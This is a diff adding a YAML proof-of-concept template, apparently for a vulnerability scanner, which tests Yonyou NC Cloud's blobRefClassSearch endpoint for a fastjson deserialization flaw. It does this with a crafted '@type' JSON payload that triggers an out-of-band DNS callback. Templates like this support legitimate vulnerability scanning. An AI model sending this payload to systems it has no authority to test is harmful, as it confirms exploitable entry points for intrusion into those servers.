@@ -1,0 +1,25 @@
+name: poc-yaml-yongyouNC-Cloud_blobRefClassSearch-fastjson
+transport: http
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ncchr/pm/ref/indiIssued/blobRefClassSearch
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Content-Type: application/json
+      body: '{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{reverseDomain}}\"}}}"}'
+    expression: reverse.wait(3)
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140515845
+
